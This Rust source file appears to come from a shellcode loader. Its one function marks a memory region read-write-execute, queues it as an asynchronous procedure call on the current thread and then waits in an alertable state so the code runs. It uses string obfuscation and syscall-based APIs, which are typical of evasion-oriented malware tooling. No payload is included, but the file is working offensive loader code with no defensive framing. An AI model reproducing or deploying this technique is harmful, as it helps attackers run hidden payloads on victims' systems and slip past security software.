#[allow(non_snake_case)]
pub unsafe fn exec(p: usize, size: usize) -> Result<(), String> {
    use obfstr::obfstr;

    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("exec_apc: queueing APC for {:#x}", p));

    use crate::api::PAGE_EXECUTE_READWRITE;
    crate::api::protect_virtual_memory(-1, p, size, PAGE_EXECUTE_READWRITE)?;

    let current_thread_handle: isize = -2isize; // Pseudo-handle for current thread
    crate::api::queue_apc_thread(current_thread_handle, p)?;

    #[cfg(feature = "debug")]
    crate::utils::print_message("APC queued via syscall, entering alertable state...");

    // wait 5 seconds to trigger APC
    let _ = crate::api::delay_execution_seconds(5)?;

    Ok(())
}